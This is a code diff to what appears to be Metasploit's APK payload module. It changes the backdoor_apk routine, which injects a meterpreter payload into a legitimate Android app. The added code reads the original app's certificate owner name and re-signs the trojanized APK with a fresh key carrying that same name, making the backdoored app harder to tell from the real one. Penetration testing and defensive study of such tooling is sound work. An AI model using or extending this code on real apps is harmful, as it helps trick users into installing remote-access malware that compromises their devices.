@@ -95,16 +95,41 @@ class Msf::Payload::Apk
     File.open("#{tempdir}/original/AndroidManifest.xml", "wb") {|file| file.puts original_manifest.to_xml }
   end
 
-  def backdoor_apk(apkfile, raw_payload)
+  def find_orig_cert_dname(orig_apkfile)
+    unzip_output = run_cmd("unzip -l #{orig_apkfile}")
+    orig_cert_file = unzip_output.match(/[\w\/-]+\.RSA/)[0]
+    bin_cert_data, err, s = Open3.capture3("unzip -p #{orig_apkfile} #{orig_cert_file}")
+    unless s.success?
+      raise RuntimeError, "Failed to find original cert data."
+    end
+    keytool_output, err, s = Open3.capture3("keytool -printcert", :stdin_data=>bin_cert_data, :binmode=>true)
+    unless s.success?
+      raise RuntimeError, "Failed to print cert data via keytool."
+    end
+    owner_line = keytool_output.lines.first.chomp
+    orig_cert_dname = owner_line.gsub(/^.*:/, '').strip
+    return orig_cert_dname
+  end
 
+  def backdoor_apk(apkfile, raw_payload)
     unless apkfile && File.readable?(apkfile)
       usage
       raise RuntimeError, "Invalid template: #{apkfile}"
     end
 
+    keytool = run_cmd("keytool")
+    unless keytool != nil
+      raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
+    end
+
     jarsigner = run_cmd("jarsigner")
     unless jarsigner != nil
       raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
+    end
+
+    unzip = run_cmd("unzip")
+    unless unzip != nil
+      raise RuntimeError, "unzip not found. If it's not in your PATH, please add it."
     end
 
     zipalign = run_cmd("zipalign")
@@ -122,19 +147,19 @@ class Msf::Payload::Apk
       raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
     end
 
-    unless File.readable?(File.expand_path("~/.android/debug.keystore"))
-      android_dir = File.expand_path("~/.android/")
-      unless File.directory?(android_dir)
-        FileUtils::mkdir_p android_dir
-      end
-      print_status "Creating android debug keystore...\n"
-      run_cmd("keytool -genkey -v -keystore ~/.android/debug.keystore \
-      -alias androiddebugkey -storepass android -keypass android -keyalg RSA \
-      -keysize 2048 -validity 10000 -dname 'CN=Android Debug,O=Android,C=US'")
-    end
-
     #Create temporary directory where work will be done
     tempdir = Dir.mktmpdir
+
+    keystore = "#{tempdir}/signing.keystore"
+    storepass = "android"
+    keypass = "android"
+    keyalias = "signing.key"
+    orig_cert_dname = find_orig_cert_dname(apkfile)
+
+    print_status "Creating signing key and keystore..\n"
+    run_cmd("keytool -genkey -v -keystore #{keystore} \
+    -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
+    -keysize 2048 -validity 10000 -dname '#{orig_cert_dname}'")
 
     File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
     FileUtils.cp apkfile, "#{tempdir}/original.apk"
@@ -203,7 +228,7 @@ class Msf::Payload::Apk
     print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
     run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
     print_status "Signing #{injected_apk}\n"
-    run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey")
+    run_cmd("jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore #{keystore} -storepass #{storepass} -keypass #{keypass} #{injected_apk} #{keyalias}")
     print_status "Aligning #{injected_apk}\n"
     run_cmd("zipalign 4 #{injected_apk} #{aligned_apk}")
 
